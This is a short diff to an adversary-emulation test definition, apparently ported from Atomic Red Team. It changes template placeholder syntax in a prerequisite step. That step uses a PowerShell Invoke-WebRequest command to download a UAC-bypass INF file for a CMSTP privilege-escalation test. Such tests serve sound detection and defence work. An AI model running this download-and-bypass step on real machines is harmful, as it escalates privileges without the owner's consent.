@@ -21,8 +21,10 @@ steps:
     - name: |
         INF file must exist on disk at specified location (#{inf_file_uac})
       inline: |
-        if (Test-Path "{{.Args.inf_file_uac}}") {exit 0} else { {New-Item -Type Directory (split-path "#{inf_file_uac}") -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
+        if (Test-Path "{{.Args.inf_file_uac}}") {exit 0} else { {
+        New-Item -Type Directory (split-path "{{.Args.inf_file_uac}}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "{{.Args.inf_file_uac}}"
+
         } }
       executor: powershell
     - name: cmstp-executing-uac-bypass
